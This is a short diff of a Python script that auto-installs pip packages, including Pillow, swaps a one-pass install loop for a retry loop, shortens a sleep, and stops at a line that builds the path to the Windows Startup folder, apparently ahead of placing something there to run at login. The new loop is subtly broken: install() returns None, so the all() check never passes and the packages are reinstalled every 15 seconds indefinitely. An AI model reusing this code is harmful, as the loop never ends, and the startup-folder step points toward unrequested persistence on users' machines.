@@ -3,7 +3,6 @@ import sys
 import time
 import os
 import shutil
-import getpass
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -14,10 +13,13 @@ packages = [
     "Pillow",
 ]
 
-for package in packages:
-    install(package)
+all_installed = False
+while not all_installed:
+    all_installed = all(install(package) for package in packages)
+    if not all_installed:
+        time.sleep(15)
 
-time.sleep(60)
+time.sleep(15)
 
 startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
